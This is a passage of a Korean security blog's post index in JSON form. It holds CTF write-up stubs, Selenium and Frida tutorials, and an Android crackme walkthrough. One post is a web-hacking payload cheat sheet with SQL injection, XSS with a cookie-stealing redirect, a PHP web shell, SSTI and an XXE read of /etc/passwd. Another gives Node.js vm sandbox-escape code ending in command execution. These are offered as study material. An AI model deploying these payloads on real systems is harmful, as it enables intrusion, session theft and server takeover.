&lt;output-dir&gt;","categories":[{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/categories/Mobile/"}],"tags":[{"name":"Penetration","slug":"Penetration","permalink":"https://blog.jhyeon.dev/tags/Penetration/"},{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/tags/Mobile/"},{"name":"App","slug":"App","permalink":"https://blog.jhyeon.dev/tags/App/"},{"name":"il2cppdumper","slug":"il2cppdumper","permalink":"https://blog.jhyeon.dev/tags/il2cppdumper/"}]},{"title":"Web/Hacking Payload Docx","slug":"webpayload-210421","date":"2021-04-20T15:00:00.000Z","updated":"2021-04-27T02:01:45.372Z","comments":true,"path":"2021/04/21/webpayload-210421/","link":"","permalink":"https://blog.jhyeon.dev/2021/04/21/webpayload-210421/","excerpt":"","text":"Intro해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다. 자료는 계속해서 업데이트가 되는 자료이며, 최신순을 기준으로 상단에 기록됩니다. 페이로드는 보안상 문제로 일부 변환되어 표시되며 다음 사이트에서 복호화가 가능합니다. http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/ SQL Injection(Basic)&#39; or &#39;1&#39; = &#39;1 &#39; or 1=1# &#39; or 1=1-- or 1=1 or true-- or 1=1/* 1′) and &#39;1′=&#39;1– admin&#39; -- &#39; order by 2# &#39; union select 1,2,3,version()# &#39; union select 1,2,3,table_name from information.schema.tables# &#39; union select 1,2,3,table_name from information.schema.tables where table_name=&#39;tb_name&#39;# select count(*) from information_schema.tables where tables_schema=database(); select length(table_name) from information_schema.tables where tables_schema=database() limit 0,1; select length(column_name) from table_name; select ascii(substring(table_name, 1, 1)) from informatio.schema.tables where table_schema=database(), limit 0, 1; SQL Injection(NoSQL)param1[$ne]=1234&amp;param2[$ne]=0000 XSS&lt;!-- basic --&gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;img src=x onerror=alert(1)&amp;gt; &amp;lt;img src=javascript:alert(1)&amp;gt; &amp;lt;img src=&quot;javascript:alert(1)&quot;&amp;gt; &amp;lt;img src=javascript:alert(String.FromCharCode(88,83,83))&amp;gt; &amp;lt;img src=x onmouseover=&quot;alert(1)&quot;&amp;gt; &amp;lt;img src=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt; &amp;lt;svg onload=alert(1)&amp;gt; &amp;lt;body onload=alert(1)&amp;gt; &lt;!-- HTML CHAR --&gt; &amp;#x3c;script&amp;#x3e;alert(1)&amp;#x3c;/script&amp;#x3e; &lt;!-- UNICODE Encoding --&gt; %u003cscript%u003ealert(1)%u003c/script%u003e &lt;!-- redirect --&gt; &amp;lt;script&amp;gt;location.href=&#39;url&#39;;&amp;lt;/script&amp;gt; &amp;lt;img src=x onerror=&quot;this.src=&#39;url&#39;&quot;;/&amp;gt; &amp;lt;iframe src=&quot;data/html, urlencode_text&quot;&amp;gt;&amp;lt;/iframe&amp;gt; &lt;!-- session hijacking --&gt; &amp;lt;script&amp;gt;location.href=&#39;url/&#39;+document.cookie;&amp;lt;/script&amp;gt; WebShell&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt; WebShell(Bypass Trick) filename extension (php.jpg , php.png …) gif89a, jpg, png (Insert to Image File Header) PHP Wrapper Injectionexpect://ls php://filter/convert.base64-encode/resource=filename SSTI(Python)&#123;&#123;7*7&#125;&#125; &#123;&#123;config.items()&#125;&#125; &#123;&#123; [].class.base.subclasses() &#125;&#125; &#123;&#123;''.class.mro()[1].subclasses()&#125;&#125; &#123;&#123; ''.__class__.__mro__[2].__subclasses__() &#125;&#125; SSTI(Bypass Trick) ascii encode(http://defindit.com/ascii.html) XML Injection&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE cmd [ &lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;cmd&gt;&amp;passwd;&lt;/cmd&gt; References https://owasp.org/www-community/xss-filter-evasion-cheatsheet https://github.com/payloadbox/ssti-payloads https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f https://github.com/omurugur/SQL_Injection_Payload/","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"Penetration","slug":"Penetration","permalink":"https://blog.jhyeon.dev/tags/Penetration/"},{"name":"OWASP","slug":"OWASP","permalink":"https://blog.jhyeon.dev/tags/OWASP/"},{"name":"WebHacking","slug":"WebHacking","permalink":"https://blog.jhyeon.dev/tags/WebHacking/"},{"name":"webhacking.kr","slug":"webhacking-kr","permalink":"https://blog.jhyeon.dev/tags/webhacking-kr/"}]},{"title":"HackPackCTF 2021 Writeup","slug":"hackpackctf-210418","date":"2021-04-17T15:00:00.000Z","updated":"2021-04-17T18:52:06.618Z","comments":true,"path":"2021/04/18/hackpackctf-210418/","link":"","permalink":"https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/","excerpt":"","text":"IntroHACKPACK CTF 2021 (4/17 Sat 01:00 ~ 4/18 Mon 01:00 KST) https://ctf2021.hackpack.club/team pwnhub (jhyeon, owl, 3kk, MalHyuk) rank : 81th (400pt) Reference해당 게시글은 아래 노션 링크를 통해 확인하실 수 있습니다. https://public.jhyeon.dev/ctf/hackpack2021","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"CTFtime","slug":"CTFtime","permalink":"https://blog.jhyeon.dev/tags/CTFtime/"},{"name":"Pwn","slug":"Pwn","permalink":"https://blog.jhyeon.dev/tags/Pwn/"},{"name":"Rev","slug":"Rev","permalink":"https://blog.jhyeon.dev/tags/Rev/"},{"name":"Crypto","slug":"Crypto","permalink":"https://blog.jhyeon.dev/tags/Crypto/"},{"name":"HackPackCTF 2021","slug":"HackPackCTF-2021","permalink":"https://blog.jhyeon.dev/tags/HackPackCTF-2021/"}]},{"title":"RITSEC-CTF 2021 Writeup","slug":"ritsec-ctf-210412","date":"2021-04-11T15:00:00.000Z","updated":"2021-04-12T06:48:21.694Z","comments":true,"path":"2021/04/12/ritsec-ctf-210412/","link":"","permalink":"https://blog.jhyeon.dev/2021/04/12/ritsec-ctf-210412/","excerpt":"","text":"IntroTEAM_NAME : pwnhub (rank 107th, 2560pt) 풀이 게시글은 아래 노션에서 확인하실 수 있습니다. https://public.jhyeon.dev/ctf/ritsec2021","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"CTFtime","slug":"CTFtime","permalink":"https://blog.jhyeon.dev/tags/CTFtime/"},{"name":"Crypto","slug":"Crypto","permalink":"https://blog.jhyeon.dev/tags/Crypto/"},{"name":"RITSEC 2021","slug":"RITSEC-2021","permalink":"https://blog.jhyeon.dev/tags/RITSEC-2021/"}]},{"title":"VirtualBox Escape Research(CVE 2019-2525 & 2548)","slug":"virtualboxcve-210411","date":"2021-04-10T15:00:00.000Z","updated":"2021-04-11T03:08:56.258Z","comments":true,"path":"2021/04/11/virtualboxcve-210411/","link":"","permalink":"https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/","excerpt":"","text":"Intro 이번에 소속으로 활동 중인 데몬팀(DEMON TEAM) 팀 세미나 진행을 위해 “VirtualBox Research Study Team” 에서 VirtualBox Escape (CVE 2019-2525 &amp; 2548) 에 대해 연구했던 자료를 공유합니다. 발표 자료는 비공개지만, 개인 노션에 정리한 자료는 다음 링크에서 확인할 수 있습니다. https://public.jhyeon.dev/research/virtualbox","categories":[{"name":"Research","slug":"Research","permalink":"https://blog.jhyeon.dev/categories/Research/"}],"tags":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"Reversing","slug":"Reversing","permalink":"https://blog.jhyeon.dev/tags/Reversing/"},{"name":"VirtualBox","slug":"VirtualBox","permalink":"https://blog.jhyeon.dev/tags/VirtualBox/"},{"name":"CVE","slug":"CVE","permalink":"https://blog.jhyeon.dev/tags/CVE/"},{"name":"CVSS","slug":"CVSS","permalink":"https://blog.jhyeon.dev/tags/CVSS/"}]},{"title":"AngStormCTF 2021 Write-Up","slug":"angstormctf-210410","date":"2021-04-09T15:00:00.000Z","updated":"2021-04-11T03:09:11.482Z","comments":true,"path":"2021/04/10/angstormctf-210410/","link":"","permalink":"https://blog.jhyeon.dev/2021/04/10/angstormctf-210410/","excerpt":"","text":"Intro이번 CTF는 평소 친한 형들과 같이 참여를 하게 되었습니다. TEAM_NAME : pwnhub (rank 195th, 1200pt) 풀이 게시글은 아래 노션에서 확인하실 수 있습니다. https://public.jhyeon.dev/ctf/angstorm2021","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"Reversing","slug":"Reversing","permalink":"https://blog.jhyeon.dev/tags/Reversing/"},{"name":"Crpyto","slug":"Crpyto","permalink":"https://blog.jhyeon.dev/tags/Crpyto/"},{"name":"AngStormCTF 2021","slug":"AngStormCTF-2021","permalink":"https://blog.jhyeon.dev/tags/AngStormCTF-2021/"},{"name":"CTFtime","slug":"CTFtime","permalink":"https://blog.jhyeon.dev/tags/CTFtime/"}]},{"title":"UMassCTF'21 Write Up","slug":"umassctf-210329","date":"2021-03-28T15:00:00.000Z","updated":"2021-03-29T14:52:13.890Z","comments":true,"path":"2021/03/29/umassctf-210329/","link":"","permalink":"https://blog.jhyeon.dev/2021/03/29/umassctf-210329/","excerpt":"","text":"Post해당 게시글은 아래의 노션을 통해서 확인이 가능합니다. https://public.jhyeon.dev/540fa8cc-458c-451c-a0d0-d614f5a57fb5","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"CTFtime","slug":"CTFtime","permalink":"https://blog.jhyeon.dev/tags/CTFtime/"},{"name":"Web Hacking","slug":"Web-Hacking","permalink":"https://blog.jhyeon.dev/tags/Web-Hacking/"},{"name":"UMassCTF'21","slug":"UMassCTF-21","permalink":"https://blog.jhyeon.dev/tags/UMassCTF-21/"}]},{"title":"AWS EC2 환경에서 Selenium(ChromeDriver) 활용하기","slug":"awschrome-210325","date":"2021-03-24T15:00:00.000Z","updated":"2021-03-25T03:58:38.819Z","comments":true,"path":"2021/03/25/awschrome-210325/","link":"","permalink":"https://blog.jhyeon.dev/2021/03/25/awschrome-210325/","excerpt":"","text":"Intro최근에 AWS EC2, Ubuntu CLI 환경에서 Selenium을 활용할 일이 있었는데 그 과정을 정리해놓고 나중에 써먹고자 아래의 글을 정리한다. Install Package우선 chromedriver를 사용하기 전 크롬과 관련된 패키지를 설치 해줘야 한다. sudo apt update sudo apt install wget unzip echo &quot;deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main&quot; &gt;&gt; /etc/apt/sources.list wget https://dl.google.com/linux/linux_signing_key.pub sudo apt install gnupg sudo apt-key add linux_signing_key.pub sudo apt install google-chrome-stable 여기까지가 관련 패키지들을 설치해주는 명령어이다. 그 다음은 selenium 설치 과정이다. pip로 selenium을 설치해주면 끝나서 간편하다. pip3 install --user selenium 이렇게만 설치한다고 끝이 아닌, 크롬 공식 홈페이지에서 driver를 다운 받아줘야 한다. http://chromedriver.chromium.org/downloads 위 사이트에서 크롬 브라우저의 버전을 선택하여 wget으로 내려 받은 뒤 실행 파일을 사용하면 된다. wget https://chromedriver.storage.googleapis.com/89.0.4389.23/chromedriver_linux64.zip unzip chromedriver_linux64.zip Example이렇게 설치했으면 크롬 브라우저를 어떻게 활용하냐, python 기준으로 예제 코드는 다음과 같다. 사실, 크롬 브라우저가 메모리를 되게 먹기 때문에 multiprocessing 처리를 하는 방식 등으로 사용하면 좋을 듯 하다. 메모리를 좀 줄여보겠다고 gpu, headless 등 각종 옵션을 넣긴 했지만 자체적으로 메모리를 많이 써서 큰 도움은 안되는 듯 하다. #!/usr/bin/python3 from selenium import webdriver from selenium.webdriver.chrome.options import Options def openbr(): url = &quot;&quot; options = webdriver.ChromeOptions() options.add_argument(&#39;--headless&#39;) options.add_argument(&#39;--no-sandbox&#39;) options.add_argument(&#39;--disable-dev-shm-usage&#39;) options.add_argument(&quot;--disable-gpu&quot;) options.add_argument(&quot;--disable-infobars&quot;) browser = webdriver.Chrome(chrome_options=options, executable_path=&quot;./chromedriver&quot;) browser.get(url) html = browser.page_source return html if __name__ == &quot;__main__&quot;: try: openbr() except Exception as excepterr: logging~~","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"AWS","slug":"AWS","permalink":"https://blog.jhyeon.dev/tags/AWS/"},{"name":"EC2","slug":"EC2","permalink":"https://blog.jhyeon.dev/tags/EC2/"},{"name":"Ubuntu CLI","slug":"Ubuntu-CLI","permalink":"https://blog.jhyeon.dev/tags/Ubuntu-CLI/"},{"name":"Selenium","slug":"Selenium","permalink":"https://blog.jhyeon.dev/tags/Selenium/"},{"name":"ChromeDriver","slug":"ChromeDriver","permalink":"https://blog.jhyeon.dev/tags/ChromeDriver/"}]},{"title":"Node.JS VM Module Sandbox Escape Research","slug":"nodejs-vmescape","date":"2021-03-07T15:00:00.000Z","updated":"2021-08-15T07:14:27.002Z","comments":true,"path":"2021/03/08/nodejs-vmescape/","link":"","permalink":"https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/","excerpt":"","text":"[1] Node.JSNode.JS는 네트워크 애플리케이션(서버 사이드) 개발에 사용되는 소프트웨어 플랫폼입니다. Javascript 언어를 사용하며, Non-blocking I/O와 단일 스레드 이벤트 루프를 사용하여 높은 처리 성능을 가지고 있습니다. 또한, HTTP 라이브러리를 내장하고 있어 웹 서버 구동에 필요한 Apache, Nginx와 같이 별도의 소프트웨어를 필요로 하지 않습니다. [2] SandboxSandbox란, 외부에서 코드를 실행하거나 신뢰할 수 없는 코드를 안전하게 실행할 수 있도록 메인 시스템과 격리된 환경에서 실행되는 환경입니다. Node.JS 기준으로는 vm 모듈이 존재하는데, 해당 모듈에 대해서는 아래 목차에서 좀 더 세심하게 다뤄보겠습니다. [3] Node.JS VM Module우선, Node JS에서는 임의의 JS 코드를 안전한 환경에서 실행될 수 있도록 하기 위해 VM 모듈을 제공하고 있습니다. 해당 모듈은 V8 가상 머신 컨택스트 내에서 코드를 컴파일하고 실행합니다. 물론, 해당 모듈이 안전하다고 볼수도 없습니다. 신뢰할 수 없는 코드나 임의의 코드를 실행할 수 있게 하지만 이러한 코드에서 Sandbox 환경을 escape하는 경우가 발생할 때는 시스템에 치명적인 영향을 미칠 수 있기 때문입니다. 아래는 VM 모듈에 대한 공식 문서 Sample Code 자료입니다. const vm = require(&#39;vm&#39;); const x = 1; const context = &#123; x: 2 &#125;; vm.createContext(context); // Contextify the object. const code = &#39;x += 40; var y = 17;&#39;; // `x` and `y` are global variables in the context. // Initially, x has the value 2 because that is the value of context.x. vm.runInContext(code, context); console.log(context.x); // 42 console.log(context.y); // 17 console.log(x); // 1; y is not defined. [4] Run VM Module Script위 예제처럼, VM 모듈을 사용하여 스크립트를 실행하는 방법은 공식 문서에 함수 표현식 옵션이 몇 가지 존재합니다. script.runInContext(contextifiedObject[, options]) const vm = require(&#39;vm&#39;) const context = &#123; id: &#39;name&#39;, price: 10000 &#125;; const script = new vm.Script(&#39;price += 10000&#39;); vm.createContext(context); script.runInContext(context); console.log(context); /** result : 20000 **/ script.runInNewContext([contextObject[, options]]) const vm = require(&#39;vm&#39;) const script = new vm.Script(&#39;variable = &quot;test&quot;&#39;); const context = [&#123;&#125;, &#123;&#125;]; context.forEach((context) =&gt; &#123; script.runInNewContext(context); &#125;); console.log(context); /** result [ &#123; variable: &#39;test&#39; &#125;, &#123; variable: &#39;test&#39; &#125; ] **/ script.runInThisContext([options]) const vm = require(&#39;vm&#39;) global.variable = 0; const script = new vm.Script(&#39;variable += 1&#39;); for(let i=0; i&lt;1000; i++)&#123; script.runInThisContext(); &#125; console.log(variable); /** result : 1000 **/ vm.createContext([contextObject[, options]]) const vm = require(&#39;vm&#39;); global.globalVar = 3; const context = &#123; globalVar: 1 &#125;; vm.createContext(context); vm.runInContext(&#39;globalVar *= 2;&#39;, context); console.log(context); // Prints: &#123; globalVar: 2 &#125; console.log(global.globalVar); // Prints: 3 vm.runInContext(code, contextifiedObject[, options]) const vm = require(&#39;vm&#39;); const obj = &#123; globalvar: 1 &#125;; vm.createContext(obj); for(let i=0; i&lt;500; i++)&#123; vm.runInContext(&#39;globalvar += 1&#39;, obj); &#125; console.log(obj); /** result : 501 **/ vm.runInNewContext(code[, contextObject[, options]]) const vm = require(&#39;vm&#39;); const contextObject = &#123; animal: &#39;cat&#39;, count: 2 &#125;; vm.runInNewContext(&#39;count += 1; name = &quot;kitty&quot;&#39;, contextObject); console.log(contextObject); // Prints: &#123; animal: &#39;cat&#39;, count: 3, name: &#39;kitty&#39; &#125; vm.runInThisContext(code[, options]) const vm = require(&#39;vm&#39;); let localVar = &#39;initial value&#39;; const vmResult = vm.runInThisContext(&#39;localVar = &quot;vm&quot;;&#39;); console.log(`vmResult: &#39;$&#123;vmResult&#125;&#39;, localVar: &#39;$&#123;localVar&#125;&#39;`); // Prints: vmResult: &#39;vm&#39;, localVar: &#39;initial value&#39; const evalResult = eval(&#39;localVar = &quot;eval&quot;;&#39;); console.log(`evalResult: &#39;$&#123;evalResult&#125;&#39;, localVar: &#39;$&#123;localVar&#125;&#39;`); // Prints: evalResult: &#39;eval&#39;, localVar: &#39;eval&#39; [5] Escaping for VM Module최근에 CTF를 자주 참여하는 편인데 이번 zer0ctf 2021 CTF에서 해당 문제가 나왔었는데, 풀이 관련은 추후 정리가 완료되는대로 별도의 포스팅을 해볼 예정입니다. 우선 [2]에서도 설명 했듯이 VM 모듈을 사용할 때 신뢰할 수 없는 코드, 임의의 코드를 실행할 수 있게 되는 경우 이러한 환경을 탈출할 수 있고, VM Context 외부의 객체를 통해 시스템에 치명적인 영향을 끼칠 수 있습니다. 아래는 일반적인 vm script 코드이며, bypass가 가능한 상황과 비교해보겠습니다. const vm = require(&#39;vm&#39;); const msg = vm.runInNewContext(`&quot;use strict&quot;; let a = &quot;hello world&quot;; a;`, Object.create(null), &#123;timeout: 500&#125;); console.log(msg); escape1.js const vm = require(&#39;vm&#39;); const cmd = vm.runInNewContext(`&quot;use strict&quot;; this.constructor.constructor(&#39;return this.process&#39;)()`, Object.create(null), &#123;timeout: 500&#125;); console.log(cmd); escape_rce.js const vm = require(&#39;vm&#39;); const cmd = vm.runInNewContext(`&quot;use strict&quot;; const process = this.constructor.constructor(&#39;return this.process&#39;)(); process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat ./hellopoc&#39;).toString()`); console.log(cmd); 위와 같이 sandbox 환경을 escape하여 RCE를 진행할 수 있게 됩니다. 물론 해당 방법 이외에도 다양한 bypass technology 들이 존재하나, 추후 여건이 되면 심화적인 접근을 다뤄보겠습니다. 참고하고 공부할 만한 링크는 아래 정리해두겠습니다. References https://nodejs.org/api/vm.html https://millermedeiros.github.io/mdoc/examples/node_api/doc/vm.html https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html https://blog.netspi.com/escape-nodejs-sandboxes/","categories":[{"name":"Research","slug":"Research","permalink":"https://blog.jhyeon.dev/categories/Research/"}],"tags":[{"name":"NodeJS","slug":"NodeJS","permalink":"https://blog.jhyeon.dev/tags/NodeJS/"},{"name":"V8 Engine","slug":"V8-Engine","permalink":"https://blog.jhyeon.dev/tags/V8-Engine/"},{"name":"VM Module","slug":"VM-Module","permalink":"https://blog.jhyeon.dev/tags/VM-Module/"},{"name":"Sandbox","slug":"Sandbox","permalink":"https://blog.jhyeon.dev/tags/Sandbox/"},{"name":"Code Execution","slug":"Code-Execution","permalink":"https://blog.jhyeon.dev/tags/Code-Execution/"}]},{"title":"AeroCTF 2021 Write up","slug":"aeroctf2021-210228","date":"2021-02-27T15:00:00.000Z","updated":"2021-02-28T10:07:36.696Z","comments":true,"path":"2021/02/28/aeroctf2021-210228/","link":"","permalink":"https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/","excerpt":"","text":"이번에 팀원분들과 함께 CTF를 진행하였습니다. 제가 푼 문제는 아래 노션에 풀이가 작성되어 있습니다! https://public.jhyeon.dev/e08f5543-0769-4404-a7fa-2e7b5a28b66e","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"AeroCTF2021","slug":"AeroCTF2021","permalink":"https://blog.jhyeon.dev/tags/AeroCTF2021/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"Frida를 통한 앱 내부 라이브러리 후킹 방법","slug":"frida-hook1-210222","date":"2021-02-21T15:00:00.000Z","updated":"2021-02-23T09:31:41.724Z","comments":true,"path":"2021/02/22/frida-hook1-210222/","link":"","permalink":"https://blog.jhyeon.dev/2021/02/22/frida-hook1-210222/","excerpt":"","text":"이번에, 앱을 분석해보다가 특정 라이브러리에 대해 후킹을 해야 하는 상황이 있었는데, 그 방법론을 기억에 남기고자 아래 작성합니다. 우선, 뭐든지 공식 문서에는 답이 매우 잘 나와있습니다. https://frida.re/docs/javascript-api/#interceptor 해당 라인을 보시면, Interceptor.attach 를 통해서 특정 함수의 호출을 catch할 수 있고, 함수의 주소를 가져오거나, 후킹을 진행할 수 있게됩니다. 아래는 예제 코드입니다. Interceptor.attach(Module.findExportByName(&quot;라이브러리 파일&quot;, &quot;함수명&quot;), &#123; onEnter: function(args)&#123; this.input = Memory.readUtf8String(args[0]); //input &#125;, onLeave: function(retval)&#123; return 0; &#125; &#125; 물론 dlopen 함수 후킹을 통해 라이브러리가 로드되는 시점을 후킹할 수도 있습니다. Interceptor.attach(Module.findExportByName(null, &quot;dlopen&quot;), &#123; onEnter: function(args)&#123; this.input = Memory.readUtf8String(args[0]); if(this.input.indexOf(&quot;lib64.so&quot;) !== -1)&#123; console.log(&quot;lib64.so Loaded!&quot;); Thread.sleep(5); &#125; &#125;, onLeave: function(retval)&#123; return 0; &#125; &#125; 이러한 방법도 있고 앞으로 앱 관련 분석을 해보면서, 조금 더 심화적인 것들을 많이 연구해보고 또 글을 쓰도록 하겠습니다.","categories":[{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/categories/Mobile/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://blog.jhyeon.dev/tags/Android/"},{"name":"Application","slug":"Application","permalink":"https://blog.jhyeon.dev/tags/Application/"},{"name":"Penetration","slug":"Penetration","permalink":"https://blog.jhyeon.dev/tags/Penetration/"},{"name":"Frida","slug":"Frida","permalink":"https://blog.jhyeon.dev/tags/Frida/"},{"name":"Hooking","slug":"Hooking","permalink":"https://blog.jhyeon.dev/tags/Hooking/"}]},{"title":"(추가) 해킹캠프(HACKINGCAMP) 22기 운영 후기","slug":"hcamp22th","date":"2021-02-20T15:00:00.000Z","updated":"2021-02-23T16:40:07.251Z","comments":true,"path":"2021/02/21/hcamp22th/","link":"","permalink":"https://blog.jhyeon.dev/2021/02/21/hcamp22th/","excerpt":"","text":"먼저, 해킹캠프에 대해서 궁금하신 분들이 있을 수 있기 때문에 아래 간략하게 설명을 남긴다. 해킹캠프란?해킹캠프는 해킹과 보안에 관심을 가지고 있는 국내 학생들을 위해 국제 해킹·보안 컨퍼런스 POC(POC SECURITY 주관)가 운영하는 해킹·보안 캠프입니다. https://hackingcamp.org Agenda 발표 세션 악성코드로 알아보는 사이버 크라임 갱(부제: 코인 떡상과 발표자의 피땀눈물) / 안소희 발표자님 버그바운티 어서오고(부제: CTF Vs Bug Bounty) / 유동현 발표자님 퍼징의 이해 및 실습 / 장대희 발표자님 Fun, Cool, Sexy 하게 해킹하기 (네트워크, 웹 프로토콜 분석 방법) / 장한빈 발표자님 웹 취약점 스캐너 / 김주원 발표자님 CodeQL Analysis / 홍승표 발표자님 이벤트 세션 숙명여대 정보보호동아리 SISS 퀴즈 이벤트 해킹캠프CTF Demon Q&amp;A (데몬팀 멤버들에게 궁금한 것들 질답하는 시간) 전체적인 Agenda는 위와 같이 구성이 되었습니다. 저 역시도 발표자분들이 진행해주시는 발표 내용을 들으면서, 유익한 지식도 많이 알게 되었습니다. 중간중간 퀴즈를 진행해주시는 SISS 분들도 고생을 많이 하셨고 재밌었던 것 같습니다. 다음은 데몬팀에서 준비한 해킹캠프 CTF에 잠깐 리뷰를 해드리겠습니다. 저를 포함한 데몬팀에서 활동하시는 분들께서 웹, 포너블, 리버싱, 미스크 분야로 총 20개의 문제를 준비하셨고, 대회 중에는 큰 문제없이 잘 끝냈던 것 같습니다. (아마도..) 사실, 중간중간 제가 출제한 문제에 대해서 버그랑 오류가 확인되었는데 자리를 잠깐 비운사이에 문제가 생겼더군요 ㅠ_ㅠ 하지만 빠르게 인지하고 수정한 덕분에 참가자분들이 혼란없이 문제를 풀이하실 수 있었던 것 같습니다. (앞으로, 조금 더 신경쓰면서 문제를 만들고 관리해야 겠습니다!!) 마지막으로, 20:00 ~ 02:00 (6시간) 동안 진행된 대회의 결과는 아래 사진을 첨부합니다. 코로나19 여파로 인해 온라인 진행이였음에도 불구하고 많은 관심을 가지고 참여해주신 참가자분들에게 감사의 인사를 전달드리고 싶고, POC 관계자분들, SISS, DEMON 팀원 모두 고생하셨습니다. 올해 하반기에 있을 해킹캠프에도 많은 관심을 가져주셨으면 좋겠습니다! CTF2/22 00:00 ~ 3/1 23:59분까지 해킹캠프 CTF에 관심이 있으신 분들이 많을 것으로 예상되어, 해당 기간동안 CTF 사이트를 공개합니다! 많은 관심 가져주시고 올해 하반기에 있을 제 23회 해킹캠프에도 많이 참여해주세요~~ https://ctf.hackingcamp.org 이상. 글을 마치겠습니다.","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"HCAMP","slug":"HCAMP","permalink":"https://blog.jhyeon.dev/tags/HCAMP/"},{"name":"HACKINGCAMP","slug":"HACKINGCAMP","permalink":"https://blog.jhyeon.dev/tags/HACKINGCAMP/"},{"name":"정보 보안","slug":"정보-보안","permalink":"https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4-%EB%B3%B4%EC%95%88/"},{"name":"해킹캠프","slug":"해킹캠프","permalink":"https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9%EC%BA%A0%ED%94%84/"}]},{"title":"안드로이드 앱 모의해킹(OWASP-MSTG) LEVEL 2 풀이","slug":"owsap-mstg-level2-210214","date":"2021-02-13T15:00:00.000Z","updated":"2021-02-24T12:17:23.165Z","comments":true,"path":"2021/02/14/owsap-mstg-level2-210214/","link":"","permalink":"https://blog.jhyeon.dev/2021/02/14/owsap-mstg-level2-210214/","excerpt":"","text":"LEVEL 2앞 포스팅에 이어서 LEVEL 2단계 어플리케이션 분석을 진행하겠습니다. APK 디컴파일 이후 MainActivity 구조를 보면 LEVEL1 단계에서 분석을 했던 것과 크게 차이는 없지만, 두 가지 변경 사항이 있습니다. Static Library 호출(foo) AsyncTask 클래스 추가 먼저 1번의 내용부터 보면 코드 내에서 foo라는 라이브러리를 호출하고 있습니다. 이는 라이브러리에서 함수를 정의해서 사용하는 의미가 있습니다. 그리고 AsyncTask의 역할은 백그라운드 작업인데, 디버깅 여부 탐지 로직에 들어간것으로 보아 백그라운드에서 돌아가면서 주기적으로 체크를 하는 것입니다. 아마도 이번 문제는 호출하는 라이브러리까지 타고 들어가서 코드를 분석해야만 풀리지 않을까라는 개인적인 생각을 합니다. 일단 이번앱에서도 Secret String 값을 찾아야 하는데, CodeCheck 메서드를 봤을 때 사진과 같이 smail 코드에선 아무런 내용이 작성되어 있지 않습니다. 다만, native method로 bar() 함수를 호출시켜서 동작하고 있는 것은 알 수 있습니다. public class CodeCheck &#123; private native boolean bar(byte[] bArr); public boolean a(String str) &#123; return bar(str.getBytes()); &#125; &#125; native method는 간단히, 리눅스 운영체제의 library(so) 파일을 로드해서 사용하는 것인데, 자세한 사항은 아래 링크에 정리가 잘 되어 있어서 참고하면 좋을 것 같다. https://minhyeokism.tistory.com/27 그럼 이 라이브러리가 어디있을까? APK 압축풀면 lib 폴더에 각 운영체제 환경별로 .so 라이브러리 파일이 있는데, 본인의 환경에 맞는 so만 분석하면 된다. IDA로 해당 라이브러리 파일을 열어서 CodeCheck 메서드를 확인해보면, 